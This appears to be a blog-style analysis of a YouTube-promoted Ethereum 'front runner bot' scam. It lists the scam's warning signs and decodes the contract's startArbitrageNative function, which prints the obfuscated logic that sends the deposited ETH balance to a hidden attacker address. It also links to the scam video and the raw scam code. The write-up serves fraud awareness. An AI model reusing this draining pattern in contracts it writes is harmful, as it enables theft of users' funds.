## Malicious Solidity Decoded
I was recently informed of a "front runner scam" involving a YouTube video promoting an Ethereum trading bot that claimed to utilize MEV (Maximal Extractible Value) techniques. This incident highlights the necessity for thorough examination and auditing of smart contracts, especially those advertised on platforms such as YouTube.

Marketed as utilizing advanced strategies, including transaction reordering by submitting transactions with higher gas fees for prioritized processing, and leveraging ChatGPT API keys to identify profitable transactions within the Ethereum mempool, the bot was ostensibly designed to maximize trading efficiency. However, its actual operation diverted users' Ethereum deposits directly to a scammer’s address through complex and hidden logic. 

Intrigued by its mechanics, I embarked on a detailed exploration to unravel how this particular front runner scam bot operated, as outlined in the subsequent sections where I decode its workings.

#### Scam video on YouTube (WARNING)
[How to make 2,700 with ChatGPT Slippage Strategy](https://m.youtube.com/watch?v=IkOUdbPeIxo&ab_channel=Cytra%7Cweb-3)

- Video is prefaced by a statement like "There are many scams out there in the crypto space". 

Beginning a video with a warning about the prevalence of scams in the cryptocurrency space is a classic social engineering tactic designed to lower the audience's guard. This approach plays on the psychological principle of inoculation, where mentioning a potential threat or concern upfront can create a sense of trust and credibility. 

#### Scam solidity code (WARNING)
[Trading Bot Code](https://binarypastes.com/raw/CJRejc)

- The provided smartcontract code is not peer-reviewd on GitHub. 

Providing smart contract code on platforms like Ghostbin, Pastebin and binarypastes.com, rather than on peer-reviewed repositories such as GitHub or GitLab, raises immediate red flags regarding the legitimacy of the code.

- Initial comment encourages user to not try first on testnet. 

```
// Testnet transactions will fail because they have no value in them
```

Using a testnet like Goerli allows users to safely observe and interact with a contract's functionality on-chain without risking real assets, providing a valuable opportunity for learning and verification. Contrary to claims that testnet transactions fail due to lack of value, they are crucial for understanding contract behavior in a risk-free environment.


#### Decoding the attack
The malicious activity in the contract is primarily executed through the StartNative function, which indirectly triggers the startArbitrageNative function. The critical lines that facilitate the theft of ETH are within the startArbitrageNative function:

```
function startArbitrageNative() internal  {
    address tradeRouter = getDexRouter(DexRouter, factory);        
    address dataProvider = getDexRouter(apiKey, DexRouter);         
    IERC20(dataProvider).createStart(msg.sender, tradeRouter, address(0), address(this).balance);
    payable(tradeRouter).transfer(address(this).balance);
}
```

Here's basically what happens:

1. Calculating Addresses: The function calculates two addresses (tradeRouter and dataProvider) using the getDexRouter function with inputs from hardcoded bytes32 values (DexRouter, factory, and apiKey). These addresses are derived from obfuscated values, making it difficult to understand their true nature without knowing the exact mechanism of getDexRouter.

2. Misleading Function Call: It then calls the createStart function on the dataProvider interface. This interface and function are not standard in ERC20 or Uniswap V2 protocols, making it suspicious. The purpose of this call, as described, is unclear and likely non-existent, serving only as a distraction.

3. Transferring ETH: Finally, the function transfers the contract's entire ETH balance to the tradeRouter address with payable(tradeRouter).transfer(address(this).balance);. This is the actual line where the theft occurs. Instead of performing any legitimate trading operation, it simply sends all the ETH stored in the contract to an address that was calculated using obfuscated logic.

In summary, the contract pretends to initiate an arbitrage trading operation through the StartNative function but ultimately redirects the user's deposited ETH to a concealed address controlled by the attacker. This is achieved by a combination of obfuscated address calculations and a deceptive transfer of funds, with the real intent hidden behind complex and seemingly legitimate trading functions.

#### Read more about front runner scams on [medium](https://medium.com/remix-ide/remix-in-youtube-crypto-scams-71c338da32d). 

> "Over the last year, but currently at critical mass, thousands of YouTube videos have been offering viewers instructions on how to set up a “front runner bot” to make money by sniping liquidity pools of BNB in PancakeSwap. It’s a scam. Don’t fall for it."